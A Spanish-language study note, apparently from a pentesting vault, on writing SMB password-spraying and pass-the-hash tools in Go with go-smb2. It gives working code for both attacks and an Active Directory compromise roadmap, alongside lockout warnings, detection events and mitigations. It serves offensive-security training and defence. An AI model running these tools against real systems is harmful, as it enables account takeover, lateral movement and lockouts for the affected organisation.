---
tags:
  - Go
  - Go/SMB
  - Active-Directory
Descripción: "Autenticarse contra SMB es la base de dos ataques clásicos de Active Directory: el password spraying (probar una contraseña contra muchos usuarios) y el pass-the-hash…"
Fecha de actualización: 2026-07-24
Nota previa: "[[01 - Codificación binaria a medida - reflection y struct tags]]"
Nota siguiente: "[[03 - NTLM - cálculo y cracking del hash]]"
Area: "[[SMB y NTLM.base|SMB y NTLM]]"
---
---

Autenticarse contra SMB es la base de dos ataques clásicos de Active Directory: el **password spraying** (probar una contraseña contra muchos usuarios) y el **pass-the-hash** (autenticarse con el hash NTLM sin conocer la contraseña). Ambos usan la misma API —el `NTLMInitiator` de `go-smb2` (nota [[00 - SMB en Go - usar go-smb2]])— cambiando solo qué credencial le das. La metodología de pentest a fondo vive en Red Team; aquí, cómo se construyen las herramientas en Go.

## Password spraying

La diferencia clave con el brute-force: <mark style="background: #FF5582A6;">pruebas **una** contraseña contra **muchos** usuarios, no muchas contra uno</mark>. Así evitas bloquear cuentas — el brute-force clásico dispara el *lockout* a los pocos intentos.

```go
f, err := os.Open("users.txt")
if err != nil {
    log.Fatalln(err)
}
defer f.Close()

for sc := bufio.NewScanner(f); sc.Scan(); {
    user := strings.TrimSpace(sc.Text())   // TrimSpace mata el \r de wordlists CRLF y las líneas vacías
    if user == "" {
        continue
    }
    conn, err := net.DialTimeout("tcp", target+":445", 5*time.Second)   // timeout: un host caído NO cuelga el spray
    if err != nil {
        continue
    }
    d := &smb2.Dialer{Initiator: &smb2.NTLMInitiator{
        User:     user,
        Password: "Primavera2026!",   // UNA contraseña para toda la lista
        Domain:   "CORP",
    }}
    if s, err := d.DialContext(ctx, conn); err == nil {   // err == nil -> credencial válida
        fmt.Printf("[+] CORP\\%s : Primavera2026!\n", user)
        s.Logoff()
    }
    conn.Close()
}
```

> [!warning]+ El spraying puede tumbar cuentas (DoS)
> Cada intento fallido cuenta para el umbral de bloqueo de la cuenta. <mark style="background: #FFB86CA6;">Rociar sin cuidado bloquea a media empresa</mark> — un DoS que ni querías. Solo contra sistemas autorizados, y con cabeza (más abajo).

## Pass-the-hash: autenticar con el hash

Recuerda de la nota [[00 - SMB en Go - usar go-smb2]] que la autenticación NTLMSSP es un *challenge-response* que usa el **hash NTLM**, no la contraseña. <mark style="background: #8000E1A6;">Eso significa que con el hash basta</mark> — no necesitas descifrarlo. Con `go-smb2`, pasas el hash en el campo `Hash` en vez de `Password`:

```go
hash, _ := hex.DecodeString("31d6cfe0d16ae931b73c59d7e0c089c0")   // el NT hash
d := &smb2.Dialer{Initiator: &smb2.NTLMInitiator{
    User:   "administrator",
    Hash:   hash,          // <- pass-the-hash: el hash en lugar de la contraseña
    Domain: "CORP",
}}
s, err := d.Dial(conn)     // autentica sin conocer la contraseña en claro
```

El pass-the-hash es un atajo en el *roadmap* típico de compromiso de un dominio AD:

1. Explotar una vuln y ganar un punto de apoyo.
2. Escalar privilegios localmente.
3. **Volcar credenciales de LSASS** (hashes, a veces texto claro).
4. Intentar crackear el hash del admin local *offline* (nota [[03 - NTLM - cálculo y cracking del hash]]).
5. Autenticarse en otras máquinas con esas credenciales, buscando **reutilización** de contraseña.
6. Repetir hasta llegar a Domain Admin.

<mark style="background: #ADCCFFA6;">Aquí está la potencia: aunque el paso 4 (crackear) falle, el pass-the-hash te lo salta</mark> — usas el hash directamente en el paso 5. Por debajo, `NTOWFv2` genera el hash y `ComputeResponseNTLMv2` la respuesta al reto; la librería lo hace por ti.

## Spraying con cabeza: lockout y detección

El spraying serio no es un bucle a pelo:

- **Respeta el umbral de bloqueo**: enumera primero la política (`net accounts`, o vía LDAP) y lanza **menos** intentos que el umbral **por ventana de tiempo** (típico: 1 intento/usuario cada 30-60 min).
- **Jitter y ritmo**: reparte en el tiempo; una ráfaga de logins fallidos desde una IP es un patrón obvio.
- <mark style="background: #FF5582A6;">Deja rastro claro</mark>: cada fallo genera un evento **4625** en el DC; una oleada es fácil de detectar. Herramientas como **NetExec** (el sucesor de CrackMapExec) automatizan esto con control de lockout.

## Pass-the-hash en 2026: cada vez más difícil

El libro (2020) presenta PtH como casi infalible. Hoy hay más fricción, y conviene saberlo:

- **NTLM está en deprecación**: Microsoft anunció en 2024 el fin de NTLM en favor de Kerberos/Negotiate. En entornos endurecidos se **deshabilita NTLM**, lo que mata el PtH sobre NTLMSSP.
- **LAPS** da a cada máquina un password de admin local **único y rotado** → rompe el paso 5 del roadmap (ya no hay reutilización del admin local).
- **Credential Guard** aísla los secretos de LSASS (paso 3 más difícil), y el grupo **Protected Users** impide el uso de NTLM para esas cuentas.

> [!info]+ Dónde vive esto en el vault
> Pass-the-hash a fondo —con su detección y mitigación— está en Red Team: [[13 - Pass the Hash (PtH)|Pass the Hash]]. Pass-the-ticket, NetExec y el compromiso completo de AD, en las áreas de **Active Directory** y **Ataques a contraseñas** del CPTS. Esta nota es solo la construcción en Go.

Los dos ataques dependen del hash NTLM. El último paso: cómo se calcula ese hash y cómo se crackea → [[03 - NTLM - cálculo y cracking del hash]].
